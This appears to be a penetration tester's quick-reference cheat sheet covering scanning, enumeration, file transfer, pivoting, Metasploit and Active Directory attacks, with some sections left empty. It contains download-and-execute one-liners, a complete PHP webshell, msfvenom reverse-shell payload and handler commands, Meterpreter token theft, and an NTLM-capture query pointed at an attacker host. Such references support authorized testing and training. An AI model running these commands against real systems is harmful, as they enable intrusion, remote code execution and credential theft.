## Intro

This page contains my most commonly used tools across my writeups, along with some common/repetitive methodologies for quick reference.


----------

# Scanning

## Common services

### TCP

| Port | Service      | Purpose                     | Pentest Focus                         |
|------|--------------|-----------------------------|---------------------------------------|
| 21   | FTP          | File transfer               | Anonymous login, weak creds           |
| 22   | SSH          | Remote shell                | Bruteforce, key reuse                 |
| 23   | Telnet       | Legacy remote access        | Cleartext credentials                 |
| 25   | SMTP         | Mail transfer               | User enumeration, open relay          |
| 53   | DNS          | Name resolution (TCP)       | AXFR / IXFR zone transfers            |
| 80   | HTTP         | Web service                 | Web vulns, CMS enum                   |
| 110  | POP3         | Mail retrieval              | Weak credentials                      |
| 139  | NetBIOS-SSN  | NetBIOS session service     | User/share enumeration                |
| 143  | IMAP         | Mail retrieval              | Credential stuffing                   |
| 443  | HTTPS        | Encrypted web               | Same as HTTP + TLS issues             |
| 445  | SMB          | Windows file sharing        | Null sessions, NTLM relay             |
| 3389 | RDP          | Remote desktop              | Cred attacks, NLA issues              |
| 3306 | MySQL        | Database                    | Weak creds, misconfig                 |
| 5432 | PostgreSQL   | Database                    | Privilege escalation                  |
| 5900 | VNC          | Remote desktop              | No auth / weak auth                   |
| 8080 | HTTP-alt     | Web apps / proxies          | Admin panels                          |


### UDP

| Port | Service        | Purpose                     | Pentest Focus                         |
|------|----------------|-----------------------------|---------------------------------------|
| 53   | DNS            | Name resolution (UDP)       | Recursion, cache poisoning            |
| 67   | DHCP (server)  | IP assignment               | Network mapping                       |
| 68   | DHCP (client)  | IP configuration            | Info disclosure                       |
| 69   | TFTP           | File transfer               | Config / backup leaks                 |
| 123  | NTP            | Time sync                   | Info leak, amplification              |
| 137  | NetBIOS-NS     | NetBIOS name service        | Host / user enumeration               |
| 138  | NetBIOS-DGM    | NetBIOS datagrams           | Enumeration                           |
| 161  | SNMP           | Network management          | Community strings                     |
| 162  | SNMP Trap      | Alerts                      | Misconfiguration                      |
| 500  | ISAKMP         | IPsec key exchange          | Aggressive mode attacks               |
| 514  | Syslog (UDP)   | Logging                     | Log injection                         |
| 520  | RIP            | Routing protocol            | Route poisoning                       |
| 1900 | SSDP           | UPnP discovery              | Device enumeration                    |
| 4500 | IPsec NAT-T    | VPN traversal               | VPN enumeration                       |


### TCP & UDP

| Port | Service  | TCP Usage                                | UDP Usage                              | Pentest Focus                         |
|------|----------|------------------------------------------|----------------------------------------|---------------------------------------|
| 53   | DNS      | AXFR / large responses                   | Standard queries                       | Zone leaks, recursion                 |
| 88   | Kerberos | Large/reliable auth exchanges            | Default authentication                 | AS-REP roasting                       |
| 123  | NTP      | Rare / fallback                          | Time synchronization                   | Info leak, amplification              |
| 389  | LDAP     | Directory queries                        | CLDAP (unauth enum)                    | User/computer enumeration             |
| 514  | Syslog   | Reliable log transport (RFC 6587)        | Legacy logging                         | Log manipulation                      |


## Network Discovery

```shell
nmap -sn -T4 <network>/24
```

## Nmap

### Identifying open ports

```shell
sudo nmap -p- --min-rate 3000 -T4 target
```

#### Scan discovered open ports
```shell
sudo nmap -sC -sV -p port1,port2, target
```

### UDP

(much slower than TCP)
```shell
nmap -sU --top-ports 100 -T4 <target>
```

# Enumeration

## SMB

Download all shares at once

## RPC


## LDAP


### Bloodhound

generates zip file too
```shell
sudo bloodhound-python -u 'user' -p 'pass' -d domainname -dc DChostname -ns DCIP -c all  --zip
```

#### Queries


## DNS

### Zone transfer

#### Find name servers
```shell
dig NS target.com
```

#### Attempt AXFR

```shell
dig axfr target.com @ns1.target.com
```



# File transfers

## Simple web server

```shell
python3 -m http.server 9001
```

## Retrieve file

```shell
wget http://IP:9001/file
```

```shell
curl http://IP:9001/file.exe -o file.exe
```

```powershell
powershell wget http://IP:9001/file.exe -o file.exe
```

```powershell
powershell -c wget IP:9001/file.exe -outfile file.exe
```

```powershell
certutil.exe -urlcache -f http://IP:9001/file.exe C:\Windows\Temp\file.exe
```

```powershell
wget.exe http://IP:9001/file.exe -OutFile file.exe
```

```powershell
Invoke-WebRequest -Uri http://IP:9001/file.exe -OutFile C:\temp\file.exe
```

## Download and execute
```shell
curl -s http://YOUR-IP:9001/exploit.sh | bash
```

```powershell
powershell -c "iex(iwr http://IP:9001/file.ps1 -UseBasicParsing)"
```

```powershell
certutil.exe -urlcache -f http://IP:9001/file.exe file.exe && file.exe
```

```shell
python3 -c "import urllib.request; urllib.request.urlretrieve('http://IP:9001/file', 'file')"
```

## Netcat

```shell
nc IP 9001 > file
```
then type GET /file HTTP/1.0 and press Enter twice

## Base64

Assuming simple web server is up
### Linux

```shell
base64 -w0 file.exe > file.b64
```
then start simple web server, and retrieve file 
### Windows

#### Send
```powershell
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("file"))
Set-Content -Path "file.b64" -Value $b64
```
then start simple server on windows and retrieve on linux:
```shell
curl -s http://IP:9001/file.b64 | base64 -d > file.txt
```
#### Download
```powershell
powershell -c "$b64=(New-Object Net.WebClient).DownloadString('http://IP:9001/file.b64');[IO.File]::WriteAllBytes('shell.exe',[Convert]::FromBase64String($b64));Start-Process shell.exe"
```

# Pivoting

## Ligolo

guide: https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/
u need 2 parts of it:
- proxy (attacker)
- agent (target)

### Attacker

start `proxy`
```shell
sudo ./proxy -selfcert -laddr 0.0.0.0:3333
```
create interface
```shell
ifcreate --name ch3ckm8
```

to decide what route (subnet) to add, type this inside ligolo shell
```shell
ifconfig
```

```shell
route_add --name ch3ckm8 --route subnet
```

```shell
start --tun ch3ckm8
```

### Target
```shell
curl http://IP:9001/agent.exe -o agent.exe
```

```shell
powershell wget http://IP:9001/agent.exe -o agent.exe
```
and
```shell
.\agent -connect IP:3333 -ignore-cert -retry
```

## Compile

In some cases, for example freeBSD systems, or any officially unsupported OS, we have to compile it ourselves:


## Chisel

### Attacker
```shell
chisel server -p 8000 --reverse
```
### Target
```shell
.\chisel.exe client 10.10.14.180:8000 R:8001:127.0.0.1:8000
```


# Port forwarding

## chisel

target
```shell
chisel server -p 8000 --reverse
```
attacker
```shell
.\chisel.exe client 10.10.14.180:8000 R:8001:127.0.0.1:8000
```

## SSH

```shell
ssh -L LPORT:TARGET_IP:RPORT USER@TARGETIP
```

### proxychains

```shell
ssh -D 1080 -q -C -N user@TARGETIP
# Then in /etc/proxychains.conf:
# socks4 127.0.0.1 1080
# then use it with any command, example: proxychains nmap -sT -p 445 10.0.0.0/24
```

## Shells

- [php webshell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

- [php revshell](https://github.com/pentestmonkey/php-reverse-shell)

## Privesc (Privilege Escalation)

[linpeas & winpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20260121-aabd17ef)

### Linux notes

### Windows notes

#### Stored credentials (cached)

```shell
cmdkey /list
```

## Cracking

John

Hashcat


## Wordlists

Seclists


## Web Attacks

### LFI



### XSS



### SSTI


--------

# Metasploit



## Search exploits
```
search exploit
```

## Spawn shell

meterpreter -> shell
```shell
shell
```

## Reverse shell

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attackerIP LPORT=attackerPORT -f exe -o rev.exe
```

```shell
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attackerIP
set LPORT attackerPORT
set ExitOnSession false
run -j
```

transfer on target's temp
```shell
certutil -urlcache -split -f "http://attackerIP:attackerPORT/rev.exe"
```

select session
```shell
sessions -i 1
```

## Processes enumeration

on meterpreter
```shell
ps
```

## Steal session tokens

on meterpreter
```shell
steal_token PID
```
then in order to use it type
```shell
shell
```


# Wireless

```shell

```


# AD attacks

## NTLM relay

mssql
```powershell
EXEC master..xp_dirtree '\\attackerIP\share';
```

```shell
sudo responder -I tun0
```

## Enable powershell script execution

```powershell
powershell
```

```powershell
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
```

## RBCD (Resource-Based Constrained Delegation)




# RDP

```
xfreerdp3 /clipboard /u:user /p:password /v:targetIP:3330 /port:3330
```



